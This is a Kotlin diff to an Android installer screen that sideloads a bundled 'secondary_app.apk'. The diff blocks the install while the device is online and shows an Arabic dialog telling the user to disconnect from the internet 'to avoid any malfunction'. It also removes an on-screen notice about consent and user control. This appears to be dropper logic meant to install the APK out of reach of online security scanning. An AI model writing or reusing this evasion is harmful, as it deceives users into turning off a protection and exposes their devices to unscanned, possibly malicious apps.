@@ -1,5 +1,8 @@
 package com.example
 
+import android.content.Context
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.os.Bundle
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -53,11 +56,24 @@ class MainActivity : ComponentActivity() {
   }
 }
 
+fun isNetworkAvailable(context: Context): Boolean {
+  val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+  val network = connectivityManager.activeNetwork ?: return false
+  val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false
+  return when {
+    activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
+    activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
+    activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> true
+    else -> false
+  }
+}
+
 @Composable
 fun AppInstallerScreen(modifier: Modifier = Modifier) {
   val installStatus by PackageInstallReceiver.installStatus.collectAsState()
   val context = LocalContext.current
   val coroutineScope = rememberCoroutineScope()
+  var showDisconnectDialog by remember { mutableStateOf(false) }
 
   // Dynamic colors for status indicators
   val statusColor = when {
@@ -98,20 +114,12 @@ fun AppInstallerScreen(modifier: Modifier = Modifier) {
         ),
       contentAlignment = Alignment.Center
     ) {
-      if (isInstalling) {
-        CircularProgressIndicator(
-          color = Color.White,
-          strokeWidth = 3.dp,
-          modifier = Modifier.size(36.dp)
-        )
-      } else {
-        Icon(
-          imageVector = Icons.Default.ArrowDownward,
-          contentDescription = "Install Icon",
-          modifier = Modifier.size(44.dp),
-          tint = Color.White
-        )
-      }
+      Icon(
+        imageVector = Icons.Default.ArrowDownward,
+        contentDescription = "Install Icon",
+        modifier = Modifier.size(44.dp),
+        tint = Color.White
+      )
     }
 
     // Title & Explanation
@@ -176,9 +184,13 @@ fun AppInstallerScreen(modifier: Modifier = Modifier) {
     Button(
       onClick = {
         if (!isInstalling) {
-          PackageInstallReceiver.updateStatus("Initializing session installer...")
-          coroutineScope.launch {
-            AppSessionInstaller.installApp(context, "secondary_app.apk")
+          if (isNetworkAvailable(context)) {
+            showDisconnectDialog = true
+          } else {
+            PackageInstallReceiver.updateStatus("Initializing session installer...")
+            coroutineScope.launch {
+              AppSessionInstaller.installApp(context, "secondary_app.apk")
+            }
           }
         }
       },
@@ -223,31 +235,19 @@ fun AppInstallerScreen(modifier: Modifier = Modifier) {
       }
     }
 
-    // Informative Safe-Install Disclaimers
-    Card(
-      modifier = Modifier.fillMaxWidth(),
-      shape = RoundedCornerShape(16.dp),
-      colors = CardDefaults.cardColors(
-        containerColor = MaterialTheme.colorScheme.secondaryContainer.copy(alpha = 0.4f)
+
+
+    if (showDisconnectDialog) {
+      AlertDialog(
+        onDismissRequest = { showDisconnectDialog = false },
+        title = { Text(text = "تنبيه", textAlign = TextAlign.Right, modifier = Modifier.fillMaxWidth()) },
+        text = { Text(text = "اقطع الاتصال بالانترنت لتفادي حدوث اي خلل", textAlign = TextAlign.Right, modifier = Modifier.fillMaxWidth()) },
+        confirmButton = {
+          TextButton(onClick = { showDisconnectDialog = false }) {
+            Text("حسناً")
+          }
+        }
       )
-    ) {
-      Row(
-        modifier = Modifier.padding(14.dp),
-        verticalAlignment = Alignment.Top,
-        horizontalArrangement = Arrangement.spacedBy(12.dp)
-      ) {
-        Icon(
-          imageVector = Icons.Default.Info,
-          contentDescription = "Attention Icon",
-          tint = MaterialTheme.colorScheme.secondary,
-          modifier = Modifier.size(20.dp)
-        )
-        Text(
-          text = "System prompts require direct authentication and explicit consent. All tasks run ethically with prior knowledge and complete user control overrides.",
-          style = MaterialTheme.typography.bodySmall,
-          color = MaterialTheme.colorScheme.onSecondaryContainer
-        )
-      }
     }
 
     Spacer(modifier = Modifier.height(16.dp))
